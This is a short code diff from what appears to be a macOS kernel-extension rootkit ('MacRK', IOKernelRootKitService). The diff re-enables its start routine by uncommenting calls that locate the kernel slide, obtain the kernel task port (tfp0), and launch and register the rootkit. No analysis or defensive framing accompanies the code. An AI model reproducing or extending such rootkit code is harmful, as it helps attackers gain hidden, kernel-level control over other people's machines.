@@ -37,19 +37,19 @@ bool IOKernelRootKitService::start(IOService *provider)
 
 	MAC_RK_LOG("MacRK::START KERNEL EXTENSION!\n");
 
-	// off_t kernel_slide = Kernel::findKernelSlide();
+	off_t kernel_slide = Kernel::findKernelSlide();
 
-	// this->kernel = new Kernel(kernel_base, kernel_slide);
+	this->kernel = new Kernel(kernel_base, kernel_slide);
 
-	// this->kernel->setRootKitService(this);
+	this->kernel->setRootKitService(this);
 
-	// this->tfp0 = this->kernel->getKernelTaskPort();
+	this->tfp0 = this->kernel->getKernelTaskPort();
 
-	// ret = mac_rootkit_start(this, this->kernel, &this->rootkitKext);
+	ret = mac_rootkit_start(this, this->kernel, &this->rootkitKext);
 
 	if(ret == kIOReturnSuccess)
 	{
-		// this->rootkit = mac_rootkit_get_rootkit();
+		this->rootkit = mac_rootkit_get_rootkit();
 
 		registerService();
 	}
